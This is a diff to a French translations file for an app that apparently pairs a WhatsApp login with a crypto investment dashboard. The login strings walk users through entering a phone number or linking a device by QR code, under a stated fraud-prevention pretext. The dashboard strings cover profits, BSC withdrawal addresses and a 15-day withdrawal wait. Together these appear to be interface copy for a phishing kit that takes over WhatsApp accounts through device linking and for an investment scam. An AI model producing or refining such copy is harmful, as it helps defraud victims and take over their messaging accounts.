@@ -2,7 +2,7 @@ import { Translations } from './types'
 
 export const fr: Translations = {
   whatsapp: {
-    title: 'Entrez votre numéro de téléphone',
+    title: 'Utiliser WhatsApp pour se connecter',
     countryRegion: 'Pays/Région',
     telephoneNumber: 'Numéro de téléphone',
     authNotice: 'Veuillez authentifier votre identité pour identifier les numéros suspects et prévenir la fraude',
@@ -11,7 +11,7 @@ export const fr: Translations = {
     selectCountry: 'Sélectionner un pays',
     nextButton: 'Suivant',
     sendingButton: 'Envoi en cours...',
-    qrTitle: 'Utiliser WhatsApp sur le Web',
+    qrTitle: 'Utiliser WhatsApp pour se connecter',
     qrStep1: 'Ouvrez WhatsApp sur votre téléphone',
     qrStep2: 'Appuyez sur <strong>Menu</strong> ou <strong>Paramètres</strong> et sélectionnez <strong>Appareils liés</strong>',
     qrStep3: 'Appuyez sur <strong>Lier un appareil</strong>',
@@ -63,7 +63,7 @@ export const fr: Translations = {
     date: 'Date',
     principal: 'Principal',
     profit: 'Profit',
-    redemptionProgress: 'Progrès du remboursement',
+    redemptionProgress: 'Progrès',
     noDataAvailable: 'Aucune donnée disponible',
     addAssets: 'Ajouter des actifs',
     enterAmountToAdd: 'Veuillez entrer le montant à ajouter',
@@ -77,6 +77,18 @@ export const fr: Translations = {
     withdrawalAmount: 'Montant du retrait',
     enterWithdrawalAmount: 'Veuillez entrer le montant du retrait',
     withdrawalAccount: 'Compte de retrait',
-    loginSuccess: 'Connexion réussie !'
+    loginSuccess: 'Connexion réussie !',
+    loginNoticeTitle: 'Veuillez vous connecter d\'abord',
+    loginNoticeMessage: 'Veuillez vous connecter avant d\'effectuer cette action',
+    loginNoticeButton: 'Aller à la connexion',
+    validationAmountRequired: 'Veuillez entrer le montant',
+    validationDaysRequired: 'Veuillez sélectionner les jours',
+    validationAmountInvalid: 'Le montant doit être entre 1 et 1000',
+    validationWithdrawAmountRequired: 'Veuillez entrer le montant du retrait',
+    validationWithdrawAddressRequired: 'Veuillez entrer le compte de retrait',
+    validationWithdrawAmountInvalid: 'Le montant du retrait doit être supérieur à 0',
+    validationWithdrawAddressInvalid: 'Veuillez entrer une adresse réseau BSC valide (commence par 0x, 42 caractères)',
+    validationWithdrawDaysRequired: 'Veuillez attendre au moins 15 jours avant de demander un retrait',
+    processing: 'Traitement en cours...'
   }
 }
